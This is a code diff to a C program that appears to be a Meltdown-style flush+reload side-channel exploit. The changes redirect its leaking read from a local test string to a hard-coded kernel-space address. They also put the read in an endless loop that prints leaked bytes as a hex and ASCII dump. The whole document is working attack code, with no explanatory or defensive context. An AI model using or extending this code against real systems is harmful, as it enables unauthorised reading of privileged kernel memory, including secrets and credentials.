@@ -8,6 +8,7 @@
 #include <stdint.h>
 
 const char strings[] = {"Michal bialek konczyl nocna zmiane w serwerowni wykopu..."};
+char disp[] = "................";
 jmp_buf array_access_exception;
 jmp_buf buf;
 static char* _mem = NULL, * mem = NULL;
@@ -88,7 +89,7 @@ int packed_read(size_t addr) {
 int read_buf() {
 	//phys = addr;
 
-	size_t retries = 10000 + 1;
+	size_t retries = 100 + 1;
 	uint64_t start = 0, end = 0;
 
 
@@ -155,7 +156,15 @@ static void detect_flush_reload_threshold() {
 		cache_miss_threshold);
 }
 
+void addchar(char a,int id) {
+	if (a >= 33 && a <=126 ){
+		disp[id] = a;
+	}
+	else {
+		disp[id] = '.';
+	}
 
+}
 
 int main() {
 
@@ -190,13 +199,23 @@ int main() {
 	
 	printf("Value is: \n%s \n",strings);
 	printf("Result is: \n");
-	char value='X';
-	while (index <=strlen(strings)) {
+	unsigned char value='X';
+	
+	int indexer = 0;
+	while (1) {
 
-		value = packed_read((strings + index));
-		printf("%X ", value);
+		value = packed_read((0xFFFFF80000b95000 + index));
+		printf("%.2X ", value);
 		fflush(stdout);
+		addchar(value, indexer);
 		index++;
+		indexer++;
+
+		if (indexer == 16) {
+			printf(" | %s \n [%d]", disp, (0xFFFFF80000b95000 + index));
+			indexer = 0;
+			//__debugbreak();
+		}
 	}
 	system("pause");
 	return 0;
